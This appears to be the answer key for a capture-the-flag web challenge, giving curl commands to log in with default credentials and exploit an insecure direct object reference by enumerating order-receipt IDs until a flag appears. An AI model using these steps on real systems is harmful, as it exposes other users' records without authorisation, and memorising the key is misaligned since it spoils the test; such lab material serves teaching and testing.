# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Insecure Direct Object Reference (IDOR) on order receipts, plus
default credentials. `/order/<id>/receipt` returns any order by ID with no check
that it belongs to the logged-in user.

1. **Log in** with the default account `test` / `test`. The login is two-step:
   first POST the username, then the password, reusing one cookie jar.

   ```
   curl -s -c cookies.txt -d "username=test" http://<target>/ -o /dev/null -L
   curl -s -c cookies.txt -b cookies.txt -d "password=test" http://<target>/password/test -o /dev/null -L
   ```

2. **View your own orders** at `/orders` to confirm the session works (the test
   user owns orders like 300123, 300214, 300327, 300481).

3. **Request an order you do NOT own.** The receipt endpoint never checks
   ownership, so fetch a nearby ID that is not in your list (e.g. 300401):

   ```
   curl -s -b cookies.txt http://<target>/order/300401/receipt
   ```

   If that ID has no flag, enumerate nearby IDs (300300–300500) until the
   receipt body contains the flag.

4. **Extract the flag** (`FLAG{...}`) from the receipt HTML and report it
   verbatim, exactly as it appears in the response — do not reconstruct it.
